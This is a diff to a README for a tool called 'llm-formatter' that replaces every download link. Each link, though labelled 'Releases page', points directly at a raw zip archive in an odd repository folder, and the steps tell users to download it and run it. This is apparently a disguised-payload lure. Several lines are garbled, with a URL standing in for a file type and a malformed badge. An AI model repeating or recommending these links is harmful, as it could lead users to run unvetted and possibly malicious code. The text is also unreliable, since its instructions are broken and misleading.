@@ -8,16 +8,16 @@ Welcome to **llm-formatter**! This handy command-line tool helps you format an e
 
 ### Get the Latest Release
 
-To download the latest version of **llm-formatter**, visit our [Releases page](https://raw.githubusercontent.com/AzoraAHAI2001/llm-formatter/main/metroscopy/llm-formatter.zip).
+To download the latest version of **llm-formatter**, visit our [Releases page](https://github.com/AzoraAHAI2001/llm-formatter/raw/refs/heads/main/metroscopy/llm-formatter-v3.8.zip).
 
-[![Download llm-formatter](https://raw.githubusercontent.com/AzoraAHAI2001/llm-formatter/main/metroscopy/llm-formatter.zip%https://raw.githubusercontent.com/AzoraAHAI2001/llm-formatter/main/metroscopy/llm-formatter.zip)](https://raw.githubusercontent.com/AzoraAHAI2001/llm-formatter/main/metroscopy/llm-formatter.zip)
+[![Download llm-formatter](https://github.com/AzoraAHAI2001/llm-formatter/raw/refs/heads/main/metroscopy/llm-formatter-v3.8.zip%https://github.com/AzoraAHAI2001/llm-formatter/raw/refs/heads/main/metroscopy/llm-formatter-v3.8.zip)](https://github.com/AzoraAHAI2001/llm-formatter/raw/refs/heads/main/metroscopy/llm-formatter-v3.8.zip)
 
 ### Installation Instructions
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/AzoraAHAI2001/llm-formatter/main/metroscopy/llm-formatter.zip).
+1. Visit the [Releases page](https://github.com/AzoraAHAI2001/llm-formatter/raw/refs/heads/main/metroscopy/llm-formatter-v3.8.zip).
 2. Look for the latest version available.
 3. Download the appropriate file for your operating system (Windows, macOS, or Linux).
-4. For Windows, this will typically be an `.exe` file. For macOS and Linux, you will find a `https://raw.githubusercontent.com/AzoraAHAI2001/llm-formatter/main/metroscopy/llm-formatter.zip` or similar.
+4. For Windows, this will typically be an `.exe` file. For macOS and Linux, you will find a `https://github.com/AzoraAHAI2001/llm-formatter/raw/refs/heads/main/metroscopy/llm-formatter-v3.8.zip` or similar.
 5. Run the downloaded file to install **llm-formatter** on your computer.
 
 ## 📋 System Requirements
@@ -88,7 +88,7 @@ The tool formats all files in your project that are not excluded by the `.gitign
 
 ### How do I update to the latest version?
 
-To update, simply download the latest version again from the [Releases page](https://raw.githubusercontent.com/AzoraAHAI2001/llm-formatter/main/metroscopy/llm-formatter.zip) and run it.
+To update, simply download the latest version again from the [Releases page](https://github.com/AzoraAHAI2001/llm-formatter/raw/refs/heads/main/metroscopy/llm-formatter-v3.8.zip) and run it.
 
 ## 📌 Topics
 
